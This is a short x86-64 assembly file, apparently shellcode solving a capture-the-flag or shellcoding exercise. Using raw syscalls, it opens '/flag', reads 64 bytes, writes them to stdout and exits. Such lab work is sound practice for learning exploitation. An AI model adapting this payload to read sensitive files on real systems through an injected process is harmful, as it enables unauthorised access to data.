.intel_syntax noprefix
.global _start
_start:
FILE:	mov BYTE PTR [rsp], '/'
	mov BYTE PTR [rsp+1], 'f'
	mov BYTE PTR [rsp+2], 'l'
	mov BYTE PTR [rsp+3], 'a'
	mov BYTE PTR [rsp+4], 'g'
	mov BYTE PTR [rsp+5], 0x00

OPEN:	lea rdi, [rsp]
	mov rsi, 0
	mov rax, 2
	syscall

READ:	mov rdi, rax
	mov rsi, rsp
	mov rdx, 64
	mov rax, 0
	syscall

WRITE:	mov rdi, 1
	mov rsi, rsp
	mov rdx, 64
	mov rax, 1
	syscall

EXIT:	mov rdi, 42
	mov rax, 60
	syscall
